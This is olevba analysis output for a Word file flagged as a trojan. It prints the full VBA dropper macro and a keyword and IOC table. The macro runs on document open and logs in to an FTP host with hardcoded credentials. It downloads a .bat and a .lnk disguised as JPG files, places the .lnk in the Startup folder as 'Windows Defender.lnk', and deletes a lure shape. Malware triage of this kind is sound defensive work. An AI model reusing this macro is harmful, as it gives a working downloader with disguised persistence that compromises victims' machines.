olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Alien.gen-10cf9a0991242d79eeafee99d39c8349b37413a436b0e635208f41444376bd48
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Alien.gen-10cf9a0991242d79eeafee99d39c8349b37413a436b0e635208f41444376bd48 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
EsOffice64Bits
End Sub
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: HEUR-Trojan.MSOffice.Alien.gen-10cf9a0991242d79eeafee99d39c8349b37413a436b0e635208f41444376bd48 - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 And Win64 Then
    'Si es de 64 bits
Private Declare PtrSafe Function FtpSetCurrentDirectory Lib "wininet.dll" Alias "FtpSetCurrentDirectoryA" (ByVal hFtpSession As Long, ByVal lpszDirectory As String) As Boolean
Private Declare PtrSafe Function FtpGetFile Lib "wininet.dll" Alias "FtpGetFileA" (ByVal hConnect As Long, ByVal lpszRemoteFile As String, ByVal lpszNewFile As String, ByVal fFailIfExists As Long, ByVal dwFlagsAndAttributes As Long, ByVal dwFlags As Long, ByRef dwContext As Long) As Boolean
Private Declare PtrSafe Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare PtrSafe Function InternetConnect Lib "wininet.dll" Alias "InternetConnectA" (ByVal hInternetSession As Long, ByVal sServerName As String, ByVal nServerPort As Integer, ByVal sUsername As String, ByVal sPassword As String, ByVal lService As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare PtrSafe Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
Private Declare PtrSafe Sub InitCommonControls Lib "comctl32" ()

#Else
    'Si es de 32 bits
Private Declare Function FtpSetCurrentDirectory Lib "wininet.dll" Alias "FtpSetCurrentDirectoryA" (ByVal hFtpSession As Long, ByVal lpszDirectory As String) As Boolean
Private Declare Function FtpGetFile Lib "wininet.dll" Alias "FtpGetFileA" (ByVal hConnect As Long, ByVal lpszRemoteFile As String, ByVal lpszNewFile As String, ByVal fFailIfExists As Long, ByVal dwFlagsAndAttributes As Long, ByVal dwFlags As Long, ByRef dwContext As Long) As Boolean
Private Declare Function InternetOpen Lib "wininet.dll" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetConnect Lib "wininet.dll" Alias "InternetConnectA" (ByVal hInternetSession As Long, ByVal sServerName As String, ByVal nServerPort As Integer, ByVal sUsername As String, ByVal sPassword As String, ByVal lService As Long, ByVal lFlags As Long, ByVal lContext As Long) As Long
Private Declare Function InternetCloseHandle Lib "wininet.dll" (ByVal hInet As Long) As Integer
Private Declare Sub InitCommonControls Lib "comctl32" ()
#End If

Dim hOpen As Long, hConnection As Long, bRet As Long, Refrescar As Boolean
Private Const scUserAgent = "vb wininet"
Private Const INTERNET_INVALID_PORT_NUMBER = 0
Private Const INTERNET_OPEN_TYPE_DIRECT = 1
Private Const FTP_TRANSFER_TYPE_BINARY = &H2
Private Const INTERNET_FLAG_PASSIVE = &H8000000
Private Const INTERNET_OPTION_USERNAME = 28
Private Const INTERNET_OPTION_PASSWORD = 29
Private Const INTERNET_OPTION_PROXY_USERNAME = 43
Private Const INTERNET_SERVICE_FTP = 1

Sub EsOffice64Bits()
#If VBA7 And Win64 Then
    Office64 = True
#Else
    Office64 = False
#End If

If Office64 Then
    Call WinA64
Else
    Call WinA64
End If
End Sub

Sub WinA64()
Dim servidor As String, Usuario As String, Contraseña As String, folder As String, file As String, file2 As String, filename As String
servidor = "files.000webhost.com"
Usuario = "x3543sd"
Contraseña = "DxMnT4MlA8gij"
'----------------------------------------
local_file = "C:\ProgramData"
folder = "/public_html"
filename1 = local_file & "\NisSrv.bat"
rfile1 = "file.jpg"
filename2 = local_file & "\Service.lnk"
rfile2 = "file2.jpg"
'----------------------------------------
file_dest = Environ("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.lnk"
hOpen = InternetOpen(scUserAgent, INTERNET_OPEN_TYPE_DIRECT, vbNullString, vbNullString, 0)
hConnection = InternetConnect(hOpen, servidor, INTERNET_INVALID_PORT_NUMBER, Usuario, Contraseña, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0)
bRet = FtpSetCurrentDirectory(hConnection, folder)
If bRet = False Then
Else
    bRet = FtpGetFile(hConnection, rfile1, filename1, False, FILE_ATTRIBUTE_ARCHIVE, 0, 1)
    bRet = FtpGetFile(hConnection, rfile2, filename2, False, FILE_ATTRIBUTE_ARCHIVE, 0, 1)
    If filename1 <> 0 Then
        If filename1 <> 0 Then
            FileCopy Ruta & filename2, file_dest
            Kill (filename2)
        End If
    End If
End If
Contador = ActiveDocument.Shapes.Count
Nombre = ActiveDocument.Shapes(2).Name
ActiveDocument.Shapes(Nombre).Select
Selection.ShapeRange.Delete
End
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wininet.dll         |Executable file name                         |
|IOC       |NisSrv.bat          |Executable file name                         |
|IOC       |Service.lnk         |Executable file name                         |
|IOC       |Defender.lnk        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

